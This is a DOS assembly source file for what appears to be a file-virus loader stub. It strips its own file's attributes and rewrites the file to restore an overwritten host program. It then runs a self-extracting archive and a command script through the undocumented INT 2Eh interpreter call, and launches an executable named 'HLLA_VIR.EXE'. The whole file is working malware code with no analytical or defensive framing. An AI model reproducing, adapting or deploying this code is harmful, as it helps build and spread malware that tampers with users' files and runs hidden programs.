cseg segment para 'code'
assume cs:cseg,ds:cseg,es:cseg
.286
MyConst equ 02dbh
org 100h
start proc near
      push cs
      pop ds
      lea di,[@5]
      mov ah,62h
      int 21h
      push bx
      mov SS_SAVE,bx
      pop ds
;---
      push di
      mov es,word ptr ds:[2ch]
      push cs
      pop ds
      mov cx,0ffffh
      xor di,di
      xor ax,ax
      inc al
      repne scasb
      inc di
      xchg si,di
      pop di
      push di
      xor cx,cx
Pred:
      mov al,byte ptr es:[si]
      mov byte ptr ds:[di],al
      cmp al,0
      jz Next
      inc si
      inc di
      inc cx
      jmp short Pred
Next:
      push cs
      pop es
      inc cx
      mov al,byte ptr ds:[ExecName]
      add al,cl
      mov byte ptr ds:[ExecName],al
      dec di
      mov Zerro,di
      pop dx
      call OpenFile
      jnb @Restore
      jmp @Exit
@Restore:
      xor cx,cx
      xor dx,dx
      call Mov_End
      xchg dx,cx
      xchg dx,ax
      sub dx,MyConst
      call Mov_Beg
      push dx
      push ax
      lea dx,Buf
      mov cx,MyConst
      call ReadFromFile
      pop dx
      pop cx
      call Mov_Beg
      xor cx,cx
      xor dx,dx
      push cx
      push dx
      call Write_Buf
      pop cx
      pop dx
      call Mov_Beg
      lea dx,Buf
      mov cx,MyConst
      call Write_Buf
      call CloseFile
      lea dx,[@5]
      mov cx,FA
      call SetAttr
;---
      mov di,Zerro
      inc di
      mov byte ptr ds:[di],20h
      inc di
      mov bx,SS_SAVE
      push bx
      pop ds
      xor ax,ax
      mov al,byte ptr ds:[80h]
      cmp al,0
      jne @@a
      push cs
      pop ds
      mov di,Zerro
      inc di
      mov byte ptr ds:[di],13
      mov byte ptr ds:[di+1],0
      jmp short @a
@@a:
      mov cl,byte ptr cs:[ExecName]
      add cl,al
      mov byte ptr cs:[ExecName],cl
      mov si,82h
      xor cx,cx
      xchg cx,ax
@b:
      lodsb
      stosb
      loop @b
@a:
      push cs
      pop ds
      mov ds:[SS_SAVE],ss
      mov ds:[SP_SAVE],sp
      lea si,FileName
      int 2eh
      mov ss,ds:[SS_SAVE]
      mov sp,ds:[SP_SAVE]
      push cs
      pop ds
;---
      lea si,ExecName
      int 2eh
      push cs
      pop ds
      mov ss,ds:[SS_SAVE]
      mov sp,ds:[SP_SAVE]
@Exit:
      mov ax,4c00h
      int 21h
;----------
SetAttr:
      mov ax,4301h
      int 21h
      ret
OpenFile:
      mov ax,4300h
      int 21h
      mov FA,cx
      xor cx,cx
      call SetAttr
      mov ax,3d02h
      int 21h
      xchg bx,ax
      ret
Mov_Beg:
      mov ax,4200h
      int 21h
      ret
Mov_End:
      mov ax,4202h
      int 21h
      ret
Write_Buf:
      mov ah,40h
      int 21h
      ret
ReadFromFile:
      mov ah,3fh
      int 21h
      ret
CloseFile:
      mov ah,3eh
      int 21h
      ret
;----------
FA        dw ?
Zerro     dw ?
SS_SAVE   dw ?
SP_SAVE   dw ?
FileName  db @2
@1:
    db '12345678.exe -e -y',13,'HLLA.c0mmAnd0s',13
@2 equ $-@1
ExecName db 13
@3:
         db 'HLLA_VIR.EXE '
@5:
         db 20h
         db 128 dup (90h)
@4 equ $-@3
Buf db MyConst dup (90h)
start endp
cseg ends
end start
